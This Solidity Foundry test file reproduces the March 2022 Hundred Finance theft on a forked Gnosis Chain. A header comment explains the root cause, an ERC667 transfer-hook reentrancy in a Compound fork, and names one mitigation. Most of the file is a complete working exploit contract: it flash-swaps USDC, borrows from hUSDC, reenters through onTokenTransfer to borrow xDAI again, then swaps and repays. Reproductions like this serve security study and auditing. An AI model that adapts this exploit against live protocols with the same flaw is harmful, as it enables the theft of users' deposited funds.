// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";

import {ICompound} from '../utils/ICompound.sol';
import {ICurve} from '../utils/ICurve.sol';
import {IUniswapV2Pair} from '../utils/IUniswapV2Pair.sol';

import {IERC20} from '../interfaces/IERC20.sol';
import {IWETH9} from '../interfaces/IWETH9.sol';

// forge test --match-contract Exploit_HundredFinance -vvv
/*
On Mar 15, 2022 an attacker stole ~6MM in various tokens from an Hundred Finance on Gnosis Chain.
The attacker managed to drain the protocol's collateral by reentering borrow calls with the onTokenTransfer
hook of ERC667 tokens.


// Attack Overview
Total Lost: ~6MM
Attack Tx: https://gnosisscan.io/tx/0x534b84f657883ddc1b66a314e8b392feb35024afdec61dfe8e7c510cfac1a098
Traces: https://dashboard.tenderly.co/tx/xdai/0x534b84f657883ddc1b66a314e8b392feb35024afdec61dfe8e7c510cfac1a098

Exploited Contract: https://gnosisscan.io/address/0x090a00A2De0EA83DEf700B5e216f87a5D4F394FE#code
Attacker Address: https://gnosisscan.io/address/0xd041ad9aae5cf96b21c3ffcb303a0cb80779e358
Attacker Contract: https://gnosisscan.io/address/0xdbf225e3d626ec31f502d435b0f72d82b08e1bdd
Attack Block: 21120320

// Key Info Sources 
Writeup: https://medium.com/immunefi/a-poc-of-the-hundred-finance-heist-4121f23a098

Principle: ERC667 Reentrancy because transfer hooks
    Located at https://gnosisscan.io/address/0x090a00A2De0EA83DEf700B5e216f87a5D4F394FE#code
    and on any other hToken (cToken fork).

    function borrowFresh(address payable borrower, uint borrowAmount) internal returns (uint) {
        ...
        ...

        /////////////////////////
        // EFFECTS & INTERACTIONS
        // (No safe failures beyond this point)

        
          We invoke doTransferOut for the borrower and the borrowAmount.
           Note: The cToken must handle variations between ERC-20 and ETH underlying.
           On success, the cToken borrowAmount less of cash.
           doTransferOut reverts if anything goes wrong, since we can't be sure if side effects occurred.
         
        doTransferOut(borrower, borrowAmount);

        // We write the previously calculated values into storage
        accountBorrows[borrower].principal = vars.accountBorrowsNew;
        accountBorrows[borrower].interestIndex = borrowIndex;
        totalBorrows = vars.totalBorrowsNew;

        // We emit a Borrow event
        emit Borrow(borrower, borrowAmount, vars.accountBorrowsNew, vars.totalBorrowsNew);

        // We call the defense hook
        // unused function
        // comptroller.borrowVerify(address(this), borrower, borrowAmount);

        return uint(Error.NO_ERROR);
    }

ATTACK:
Hundred Finance is a fork of Compound on Gnosis that implemented the doTransferOut hook. The main difference between Compond and Hundred
is that Compound checks if the tokens used are ERC20 compliant to prevent hooks (such as 777s and 667s).
The doTransferOut() function is invoked before updating the internal accountancy of the borrow allowing reentrancy.

MITIGATIONS:
1) Respect the checks-effects-interactions pattern.
*/

IERC20 constant usdc  = IERC20(0xDDAfbb505ad214D7b80b1f830fcCc89B60fb7A83);
IERC20 constant wxdai = IERC20(0xe91D153E0b41518A2Ce8Dd3D7944Fa863463a97d);

address constant husd = 0x243E33aa7f6787154a8E59d3C27a66db3F8818ee; // HUNDRED USDC POOL
address constant hxdai = 0x090a00A2De0EA83DEf700B5e216f87a5D4F394FE; // HUNDRED XDAI POOL

contract Exploit_HundredFinance is TestHarness {
    ICurve curve = ICurve(0x7f90122BF0700F9E7e1F688fe926940E8839F353);
    IUniswapV2Pair private constant pairUsdcWxdai = IUniswapV2Pair(0xA227c72a4055A9DC949cAE24f54535fe890d3663);

    uint256 amountBorrowed;
    uint16 timesBorrowed;

    function setUp() external {
        cheat.createSelectFork("gnosis", 21120319); // We pin one block before the exploit happened.
    }

    receive() external payable {
        emit log_named_decimal_uint('Native tokens balance after receive fallback', address(this).balance, 18);
    } 

    function test_attack() external {
        // First, flashswap some usdc from the pair
        // If we ask for the whole balance, reverts with INSUFFICIENT_LIQUIDITY
        uint256 borrowAmount = usdc.balanceOf(address(pairUsdcWxdai)) - 1; 
        console.log('------- STEP 1: FLASHSWAP -------');
        pairUsdcWxdai.swap(
            pairUsdcWxdai.token0() == address(wxdai) ? 0 : borrowAmount,
            pairUsdcWxdai.token0() == address(wxdai) ? borrowAmount : 0,
            address(this),
            abi.encode("0xdeadbeef") // trigger the loan by sending arbitrary data
        );
    }

    // Flashswap callback
    function uniswapV2Call(address , uint256 _amount0, uint256 _amount1, bytes calldata ) external {
        // attackLogic(_amount0, _amount1, _data);
        require(msg.sender == address(pairUsdcWxdai), 'Only callable by pair');

        console.log('------- STEP 2: FLASHSWAP CALLBACK -------');
        uint256 amountToken = _amount0 == 0 ? _amount1 : _amount0;
        amountBorrowed = amountToken;
        console.log('Attacker Contract balance after flashswap');
        logBalances(address(this));       

        console.log('------- STEP 3: HUSDC BORROW -------');
        uint256 balance = usdc.balanceOf(address(this));
        usdc.approve(husd, balance);
        ICompound(husd).mint(balance);

        uint256 amount = (amountBorrowed * 90) / 100;
        ICompound(husd).borrow(amount);

        console.log('Attacker balances after HUSDC borrow');
        logBalances(address(this));

        console.log('Hundred balances after HUSDC borrow');
        logBalances(husd);

        console.log('------- STEP 4: SWAP EARNINGS -------');
        IWETH9(payable(address(wxdai))).deposit{value: address(this).balance}();
        wxdai.approve(address(curve), wxdai.balanceOf(address(this)));
        curve.exchange(0, 1, wxdai.balanceOf(address(this)), 1);
        console.log('Attacker balances after swapping');
        logBalances(address(this));

        console.log('------- STEP 5: REPAY FLASHLOAN -------');
        uint256 amountRepay = ((amountToken * 1000) / 997) + 1; // Repay amount + fees.
        require(usdc.transfer(address(pairUsdcWxdai), amountRepay), 'usdc payback failed');
        emit log_named_decimal_uint('USDC Repaid', amountRepay, 6);
        console.log('\n');

        console.log('------- STEP 6: ENDING BALANCES -------');
        console.log('Attacker');
        logBalances(address(this));
        
        console.log('Hundred DAI Pool');
        logBalances(hxdai);

        console.log('Hundred USDC Pool');
        logBalances(husd);
    }

    // Logic made in the token hook. This will be called every time an xDAI transfer is made to this contract.
    function onTokenTransfer(address sender, uint256 , bytes memory ) external {
        // We do not want to revert as this hook is called on transfers, just control the logic executed.
        if(sender != address(pairUsdcWxdai) && timesBorrowed == 0){
            emit log_string('------- onTokenTransfer HOOK -------');
            borrowXDAI();
        }
    }

    function borrowXDAI() public {
        timesBorrowed++;

        uint amount = ((amountBorrowed * 1e12) * 60) / 100;

        ICompound(hxdai).borrow(amount);

        console.log('Attacker Balances after XDAI borrow in hook');
        logBalances(address(this));

        console.log('Hundred Balances after XDAI borrow in hook');
        logBalances(hxdai);
    }

    function logBalances(address _from) internal {
        emit log_named_decimal_uint('NATIVE TOKENS', _from.balance, 18);
        emit log_named_decimal_uint('USDC', usdc.balanceOf(_from), 6);
        emit log_named_decimal_uint('WXDAI', wxdai.balanceOf(_from), 18);
        console.log('\n');
    }
    
}